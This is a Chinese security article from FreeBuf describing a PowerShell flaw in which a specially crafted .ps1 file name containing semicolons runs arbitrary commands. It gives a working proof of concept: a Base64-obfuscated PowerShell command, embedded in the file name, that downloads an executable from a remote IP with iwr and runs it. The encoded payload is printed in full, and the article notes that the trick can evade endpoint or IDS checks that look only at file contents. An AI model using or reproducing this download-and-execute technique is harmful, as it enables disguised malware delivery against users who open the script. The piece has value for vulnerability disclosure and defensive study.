**Windows
PowerShell是专门为系统管理员设计的Windows命令行外壳程序。PowerShell包括可独立使用或组合使用的交互式提示和脚本环境。**  

我们在一次测试中偶然发现，由于信任未过滤的文件名，因此在运行特殊命名的脚本时，PowerShell可能会执行任意代码。

测试发现当“ .ps1”文件包含分号“;”或者空格作为文件名一部分时，就会出现这种情况。

测试发现运行带有特殊格式文件名的脚本后，可以导致执行其他木马如exe文件，也可以是任何可执行文件如.com，.exe，.bat，.cpl，.js，.vbs和.wsf。

例如：使用".\calc;1.ps1"则可以用来执行calc.exe，如果使用标准调用了该脚本Windows外壳程序“ cmd.exe”和“
calc.exe”与ps1脚本位于同一目录中。如下图所示：

![](https://image.3001.net/images/20191115/1573800555_5dce4a6b53b1a.png!small)

但是，如果这些脚本是从PowerShells Shell运行的而不是“ cmd.exe”，则“＆”（调用运算符）将阻止我们的漏洞利用。

不过，如果用户启用了“ .ps1”脚本以将PowerShell作为默认程序打开，则只需双击该文件即可触发漏洞利用。“＆”呼叫运算符将不再起效果。
另外，如果用户尚未启用PowerShell来打开.ps1脚本，

![](https://image.3001.net/images/20191115/1573801339_5dce4d7b23d94.gif!small)

默认情况下 然后从cmd.exe运行脚本，例如：

    
    
    c:\>powershell "\Hello;World.ps1"

也可以直接运行，而无需放入PowerShell shell。

我的PoC测试下载一个远程可执行文件，将其保存到计算机中，然后执行它，而与PS文件本身的内容无关紧要。PS文件本身就是一个简单的：Write-Host
"Hello World!"

另外，请注意，在vicitm调用“
iwr”（调用webrequest）之后，需要使用“％CD”来定位当前工作目录，缩写为空格，为了确保下载完成，需要睡眠2秒钟，然后执行。

测试过程如下：

1、生成powershell命令：首先，我们创建一个用于混淆的Base64编码的文件名； 它将下载并执行一个在本例中名为“
calc.exe”的远程可执行文件。

将可执行文件托管在Web服务器上，或仅使用python -m SimpleHTTPServer 80或任何其他工具。

    
    
    C:\>powershell [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("'powershell iwr 192.168.220.134/calc.exe -OutFile %CD%/calc.exe;sleep -s 2;start calc.exe'"))

![](https://image.3001.net/images/20191115/1573802187_5dce50cb26a7e.png!small)

注意windows的文件名长度，尽量简写，如：

    
    
    C:\>powershell [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("'powershell iwr 192.168.220.134/p %CD%/p.exe;sleep -s 2;start p.exe'"))

cABvAHcAZQByAHMAaABlAGwAbAAgAGkAdwByACAAMQA5ADIALgAxADYAOAAuADIAMgAwA**AMQAzADQALwBwACAAYwA6AFw**wBpAG4AZABvAHcAcwBcAGQAZQBiAHUAZwBcAFcASQBBAC8AcAAuAGUAeABlADsAcwBsAGUAZQBwACAALQBzACAAMgA7AHMAdABhAHIAdAAgAHAALgBlAHgAZQA=

这可能会破坏PowerShell的完整性，因为它可能允许意外的代码执行。 即使脚本内容经过视觉检查也是如此。

我们也许还可以绕过某些端点保护或IDS系统，这些系统可能只查看文件的内容或标头，而不查看文件名。

为此，用户在打开“ .ps1”文件时必须已将PowerShell启用为其默认程序。

2、然后给PS脚本起一个普通的开始名称，然后使用“;”分隔命令。“ -e”是EncodedCommand的缩写，用于再次保存文件名空间。例如

    
    
    test; powershell -e <BASE64编码命令>; 2.ps1

3、双击以在PowerShell中打开，效果如下：

![](https://image.3001.net/images/20191115/1573810686_5dce71fe7d071.gif!small)

或者在命令行下执行：

![](https://image.3001.net/images/20191115/1573811207_5dce740747980.png!small)

以上示例是使用了“文件名嵌入式下载器”，其实我们还可以在同一目录中调用其他各种类型的第二特洛伊木马文件。

使用起来，是需要用户交互，需要想一个场景来利用。

显然运行任何随机PS脚本都是危险的……

但是，我们查看了文件内容，

![](https://image.3001.net/images/20191115/1573811117_5dce73ad9db26.png!small)

仅仅是打印了一个字符串，文件名理论上被查杀的可能性小。

 ***本文原创作者：freexploit，本文属于FreeBuf原创奖励计划，未经许可禁止转载**

